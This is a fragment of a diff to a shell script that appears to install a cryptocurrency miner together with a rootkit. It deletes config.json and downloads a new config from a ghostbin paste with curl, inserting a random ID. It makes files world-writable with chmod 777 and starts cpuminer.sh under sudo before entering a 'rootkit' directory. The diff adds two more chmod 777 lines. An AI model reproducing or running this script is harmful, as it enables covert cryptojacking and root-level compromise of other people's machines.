@@ -10,6 +10,8 @@ rm config.json
 NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
 curl https://ghostbin.com/B545M/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
 sudo chmod 777 *
+sudo chmod 777 start.sh
+sudo chmod 777 cpuminer.sh
 sudo chmod 777 /miner/binaries/*
 sudo ./cpuminer.sh & 
 cd rootkit
